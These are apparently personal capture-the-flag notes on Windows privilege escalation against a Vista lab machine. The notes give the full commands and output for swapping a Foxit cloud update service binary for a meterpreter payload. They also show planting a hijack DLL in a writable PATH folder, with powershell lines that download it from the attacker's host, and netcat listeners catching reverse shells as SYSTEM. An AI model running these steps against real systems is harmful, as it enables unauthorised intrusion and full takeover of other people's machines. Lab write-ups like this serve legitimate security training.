 Volume Serial Number is DC74-4FCB                                                                                                                                      
 Volume in drive C is HDD                                                                                                                                               
 Volume Serial Number is DC74-4FCB                                                                                                                                      
                                                                                                                                                                        
C:\Users\daisy\Documents\MumbleAutomaticCertificateBackup.p12                                                                                                           
C:\Windows\Panther\setupinfo                                                                                                                                            
C:\Windows\winsxs\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.0.6002.18005_none_6ef387546a5193ce\appcmd.exe                                          
C:\Windows\winsxs\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.0.6002.18005_none_794831a69eb255c9\appcmd.exe                                          
C:\xampp\apache\conf\httpd.conf                                                                                                                                         
C:\xampp\apache\conf\httpd.conf                                                                                                                                         
C:\xampp\apache\conf\original\httpd.conf                                                                                                                                
C:\xampp\apache\conf\original\httpd.conf                                                                                                                                
C:\xampp\apache\conf\ssl.csr\server.csr                                                                                                                                 
C:\xampp\apache\logs\access.log                                                                                                                                         
C:\xampp\apache\logs\error.log                                                                                                                                          
C:\xampp\apache\logs\access.log                                                                                                                                         
C:\xampp\apache\logs\error.log                                                                                                                                          
C:\xampp\htdocs\public_html\cache\config_active_modules.php                                                                                                             
C:\xampp\htdocs\public_html\cache\config_adlinks.php                                                                                                                    
C:\xampp\htdocs\public_html\cache\config_blocks_list.php                                                                                                                
C:\xampp\htdocs\public_html\cache\config_MAIN_CFG.php                                                                                                                   
C:\xampp\htdocs\public_html\cache\config_waitlist.php                                                                                                                   
C:\xampp\htdocs\public_html\includes\config.php                                                                                                                         
C:\xampp\htdocs\public_html\install2-old-remove\config.php                                                                                                              
C:\xampp\mysql\bin\my.ini                                                                                                                                               
C:\xampp\php\php.ini                                                                                                                                                    
C:\xampp\php\pear\Config.php                                                                                                                                            
C:\xampp\php\pear\PEAR\Config.php                                                                                                                                       
C:\xampp\php\pear\PEAR\Command\Config.php                                                                                                                               
C:\xampp\php\pear\phing\ConfigurationException.php                                                                                                                      
C:\xampp\php\pear\phing\RuntimeConfigurable.php                                                                                                                         
C:\xampp\php\pear\phing\parser\ProjectConfigurator.php                                                                                                                  
C:\xampp\php\pear\PHP\Debug\Renderer\HTML\DivConfig.php                                                                                                                 
C:\xampp\php\pear\PHP\Debug\Renderer\HTML\TableConfig.php                                                                                                               
C:\xampp\php\pear\PhpDocumentor\phpDocumentor\Smarty-2.6.0\libs\Config_File.class.php                                                                                   
C:\xampp\php\pear\PhpDocumentor\phpDocumentor\Smarty-2.6.0\libs\plugins\function.config_load.php                                                                        
C:\xampp\php\pear\PHPUnit\Util\Configuration.php                                                                                                                        
C:\xampp\phpMyAdmin\config.inc.php                                                                                                                                      
C:\xampp\phpMyAdmin\config.sample.inc.php                                                                                                                               
C:\xampp\phpMyAdmin\show_config_errors.php                                                                                                                              
C:\xampp\phpMyAdmin\examples\config.manyhosts.inc.php                                                                                                                   
C:\xampp\phpMyAdmin\libraries\Config.class.php                                                                                                                          
C:\xampp\phpMyAdmin\libraries\config.default.php                                                                                                                        
C:\xampp\phpMyAdmin\libraries\config.values.php                                                                                                                         
C:\xampp\phpMyAdmin\libraries\vendor_config.php                                                                                                                         
C:\xampp\phpMyAdmin\libraries\config\ConfigFile.class.php                                                                                                               
C:\xampp\phpMyAdmin\libraries\config\config_functions.lib.php                                                                                                           
C:\xampp\phpMyAdmin\libraries\config\ServerConfigChecks.class.php                                                                                                       
C:\xampp\phpMyAdmin\libraries\plugins\auth\AuthenticationConfig.class.php                                                                                               
C:\xampp\phpMyAdmin\libraries\tcpdf\tcpdf_autoconfig.php                                                                                                                
C:\xampp\phpMyAdmin\libraries\tcpdf\config\tcpdf_config.php                                                                                                             
C:\xampp\phpMyAdmin\setup\config.php                                                                                                                                    
C:\xampp\phpMyAdmin\setup\frames\config.inc.php                                                                                                                         
C:\xampp\phpMyAdmin\setup\lib\ConfigGenerator.class.php                                                                                                                 
                                                                                                                                                                        
---                                                                                                                                                                     
Scan complete.                                                                                                                                                                        
```

## Foxit Reader

Got a hint

```
C:\Users\daisy>sc qc filezillaserver
sc qc filezillaserver
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: filezillaserver
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\xampp\filezillaftp\filezillaserver.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : FileZillaServer
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

C:\Users\daisy>
```

```
C:\Program Files (x86)\Foxit Software>sc qc FoxitCloudUpdateService
sc qc FoxitCloudUpdateService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: FoxitCloudUpdateService
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\FCUpdateService.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Foxit Cloud Safe Update Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

C:\Program Files (x86)\Foxit Software>

C:\Program Files (x86)\Foxit Software\Foxit Reader>copy C:\Users\daisy\meterpreter.exe Foxit.exe
copy C:\Users\daisy\meterpreter.exe Foxit.exe
        1 file(s) copied.

C:\Program Files (x86)\Foxit Software\Foxit Reader>

C:\Program Files (x86)\Foxit Software\Foxit Reader>icacls Foxit Cloud/FCUpdateService.exe
icacls Foxit Cloud/FCUpdateService.exe
Invalid parameter "Cloud/FCUpdateService.exe"

C:\Program Files (x86)\Foxit Software\Foxit Reader>cd Foxit Cloud
cd Foxit Cloud

C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud>icacls FCUpdateService.exe
icacls FCUpdateService.exe
FCUpdateService.exe NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud>shutdown /r
shutdown /r

C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud>                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```


```powershell
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 80                                                                                                                                                1 ⨯
listening on [any] 80 ...
connect to [192.168.49.121] from (UNKNOWN) [192.168.121.44] 49158
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami 
whoami
nt authority\system

C:\Windows\system32>cd \Users\fluffy\Desktop
cd \Users\fluffy\Desktop

C:\Users\fluffy\Desktop>type proof.txt
type proof.txt
e0bf109dca1592816e455dbc80e8d014

C:\Users\fluffy\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.121.44
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.121.254

Tunnel adapter Local Area Connection* 6:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 7:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Users\fluffy\Desktop>
```

![](Pasted%20image%2020220206010020.png)

# Privesc DLL
```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 80                                                                                                                                                1 ⨯
listening on [any] 80 ...
connect to [192.168.49.111] from (UNKNOWN) [192.168.111.44] 49354
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\UnrealTournament\System>whoami
whoami
fluffy-pc\daisy

C:\UnrealTournament\System>sc query IKEEXT
sc query IKEEXT

SERVICE_NAME: IKEEXT 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\UnrealTournament\System>dir wlbsctrl.dll /s
dir wlbsctrl.dll /s
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB
File Not Found

C:\UnrealTournament\System>PATH
PATH
PATH=C:\Python\Scripts\;C:\Python\;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\

C:\UnrealTournament\System>icacls C:\Python\Scripts\
icacls C:\Python\Scripts\
C:\Python\Scripts\ BUILTIN\Administrators:(I)(F)
                   BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                   NT AUTHORITY\SYSTEM:(I)(F)
                   NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                   BUILTIN\Users:(I)(OI)(CI)(RX)
                   NT AUTHORITY\Authenticated Users:(I)(M)
                   NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files

C:\UnrealTournament\System>icacls C:\Python\
icacls C:\Python\
C:\Python\ BUILTIN\Administrators:(I)(F)
           BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
           BUILTIN\Users:(I)(OI)(CI)(RX)
           NT AUTHORITY\Authenticated Users:(I)(M)
           NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files

C:\UnrealTournament\System>powershell -c "wget 192.168.49.111/wlbsctrl.dll -o C:\Python\wlbsctrl.dll"
powershell -c "wget 192.168.49.111/wlbsctrl.dll -o C:\Python\wlbsctrl.dll"


^C
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 80                                                                                                                                                1 ⨯
retrying local 0.0.0.0:80 : Address already in use
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 80                                                                                                                                                1 ⨯
listening on [any] 80 ...
connect to [192.168.49.111] from (UNKNOWN) [192.168.111.44] 49555
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\UnrealTournament\System>powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.111/wlbsctrl.dll','C:\Python\wlbsctrl.dll')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.111/wlbsctrl.dll','C:\Python\wlbsctrl.dll')"


C:\UnrealTournament\System>dir /B C:\Python\wlbsctrl.dll
dir /B C:\Python\wlbsctrl.dll
wlbsctrl.dll

C:\UnrealTournament\System>shutdown -r -t 10 && exit
shutdown -r -t 10 && exit
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 4445  
[sudo] password for kali: 
listening on [any] 4445 ...
connect to [192.168.49.111] from (UNKNOWN) [192.168.111.44] 49158
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd \Users\Administrator
cd \Users\Administrator
The system cannot find the path specified.

C:\Windows\system32>cd \Users
cd \Users

C:\Users>dir
dir
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB

 Directory of C:\Users

09/30/2015  11:19 PM    <DIR>          .
09/30/2015  11:19 PM    <DIR>          ..
03/20/2022  06:22 PM    <DIR>          daisy
11/12/2015  05:39 AM    <DIR>          fluffy
10/07/2015  04:05 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  13,073,342,464 bytes free

C:\Users>cd daisy\Desktop
cd daisy\Desktop

C:\Users\daisy\Desktop>dir
dir
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB

 Directory of C:\Users\daisy\Desktop

12/22/2020  05:14 AM    <DIR>          .
12/22/2020  05:14 AM    <DIR>          ..
10/03/2015  02:17 AM               762 HexChat (x64).lnk
10/03/2015  02:24 AM               846 inspircd.lnk
10/03/2015  03:03 AM               108 irc.txt
03/20/2022  05:59 PM                34 local.txt
09/30/2015  11:01 PM               838 Mumble.lnk
10/06/2015  10:16 AM             2,347 Murmur.lnk
10/06/2015  10:14 AM             1,622 Start UT Server (Looped).lnk
09/30/2015  10:59 PM               586 XAMPP Control Panel.lnk
10/07/2015  04:44 AM            55,004 xampp.pdf
               9 File(s)         62,147 bytes
               2 Dir(s)  13,073,342,464 bytes free

C:\Users\daisy\Desktop>cd ..\..\fluffy\Desktop
cd ..\..\fluffy\Desktop

C:\Users\fluffy\Desktop>dir
dir
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB

 Directory of C:\Users\fluffy\Desktop

12/22/2020  05:17 AM    <DIR>          .
12/22/2020  05:17 AM    <DIR>          ..
10/03/2015  02:17 AM               762 HexChat (x64).lnk
10/03/2015  02:34 AM               774 inspircd.lnk
09/30/2015  11:01 PM               838 Mumble.lnk
09/30/2015  11:01 PM             1,860 Murmur.lnk
03/20/2022  06:00 PM                34 proof.txt
10/06/2015  10:14 AM             1,622 Start UT Server (Looped).lnk
09/30/2015  10:59 PM               586 XAMPP Control Panel.lnk
09/30/2015  10:59 PM               507 XAMPP htdocs folder.lnk
               8 File(s)          6,983 bytes
               2 Dir(s)  13,073,387,520 bytes free

C:\Users\fluffy\Desktop>type proof.txt
type proof.txt
4b447d01fb4c62f79135f45f5bdc3261

C:\Users\fluffy\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.111.44
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.111.254

Tunnel adapter Local Area Connection* 6:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Users\fluffy\Desktop>
```

# Others
https://www.google.com/search?q=foxit+reader+exploit+privilege+escalation&rlz=1C1ONGR_enSG945SG945&sxsrf=APq-WBt0u0jnIKONLEj14xpofIu1a08vrQ%3A1644079386884&ei=Gqn-YYO3NZmo4t4PiPiW6AI&ved=0ahUKEwiDrNn-gOn1AhUZlNgFHQi8BS0Q4dUDCA8&uact=5&oq=foxit+reader+exploit+privilege+escalation&gs_lcp=Cgdnd3Mtd2l6EAM6BwgjELADECc6BwgAEEcQsAM6BQgAEIAEOgYIABAWEB46CAghEBYQHRAeOgQIIRAKSgQIQRgASgQIRhgAUKgEWLYaYPobaAFwAngAgAF9iAGxCpIBBDIwLjGYAQCgAQHIAQnAAQE&sclient=gws-wiz

Need to search specifically for privilege escalation
https://www.exploit-db.com/exploits/36390
No nede SeShutdownPrivilege to reboot system

Windows Vista Privesc